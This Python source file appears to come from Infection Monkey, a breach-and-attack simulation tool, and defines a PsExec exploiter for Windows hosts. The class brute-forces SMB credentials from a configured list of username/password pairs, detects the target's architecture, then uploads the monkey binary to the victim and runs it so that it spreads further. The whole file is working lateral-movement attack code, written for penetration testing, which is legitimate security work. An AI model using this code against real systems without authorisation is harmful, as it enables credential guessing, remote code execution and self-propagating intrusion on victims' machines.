import logging
from typing_extensions import Literal

from common.utils.exceptions import FailedExploitationError
from common.utils.exploit_enum import ExploitType
from infection_monkey.exploit.HostExploiter import HostExploiter
from infection_monkey.exploit.tools.helpers import build_monkey_commandline, get_monkey_depth
from .tools.binary_uploading_tools.monkey_binary_downloader import MonkeyBinaryDownloader
from infection_monkey.exploit.tools.psexec_api import PsExecApi
from infection_monkey.exploit.web_rce import WIN_ARCH_64, WIN_ARCH_32
from infection_monkey.model import VictimHost, GET_ARCH_WINDOWS, RUN_MONKEY, MONKEY_ARG

LOG = logging.getLogger(__name__)

TEMP_MONKEY_BINARY_FILEPATH = './monkey_temp_bin'


class PsExecExploiter(HostExploiter):
    # attack URLs
    _TARGET_OS_TYPE = ['windows']
    EXPLOIT_TYPE = ExploitType.BRUTE_FORCE
    _EXPLOITED_SERVICE = 'SMB'

    def __init__(self, host: VictimHost):
        super().__init__(host)

    def _exploit_host(self):
        try:
            LOG.info("Brute forcing PsExec credentials.")
            psexec_api = self.get_psexec_api()
            LOG.info(f"PsExec login credentials for {self.host.ip_addr} established.")
            arch = PsExecExploiter.get_host_arch(psexec_api)

            if arch == WIN_ARCH_32:
                monkey_path_on_victim = self._config.dropper_target_path_win_32
            else:
                monkey_path_on_victim = self._config.dropper_target_path_win_64

            monkey_params = build_monkey_commandline(target_host=self.host,
                                                     depth=get_monkey_depth() - 1,
                                                     vulnerable_port=None,
                                                     location=monkey_path_on_victim)

            with MonkeyBinaryDownloader(is_windows=True, is_32bit=(arch == WIN_ARCH_32)) as monkey_binary:
                monkey_binary = monkey_binary.replace('/', '\\')
                monkey_execution_command = RUN_MONKEY % {'monkey_path': monkey_binary,
                                                         'monkey_type': MONKEY_ARG, 'parameters': monkey_params}
                response = psexec_api.send_and_run_file(monkey_execution_command)

                if monkey_binary in response.output and 'started' in response.output:
                    LOG.info("PsExec exploiter succeeded.")
                    return True
                else:
                    LOG.info(f"PsExec failed executing monkey:{response.output}.")
                    return False

        except FailedExploitationError:
            LOG.info(f"PsExec failed exploiting {self.host.ip_addr}.")
            return False

    @staticmethod
    def get_host_arch(psexec_api: PsExecApi) -> Literal[WIN_ARCH_64, WIN_ARCH_32]:
        response = psexec_api.execute_command(GET_ARCH_WINDOWS)
        if "64-bit" in response.output:
            return WIN_ARCH_64
        else:
            return WIN_ARCH_32

    def get_psexec_api(self) -> PsExecApi:
        for username, password in self._config.get_exploit_user_password_pairs():
            psexec_api = PsExecApi(username=username, password=password, target_ip=self.host.ip_addr)
            if psexec_api.is_valid_credentials():
                return psexec_api
        raise FailedExploitationError
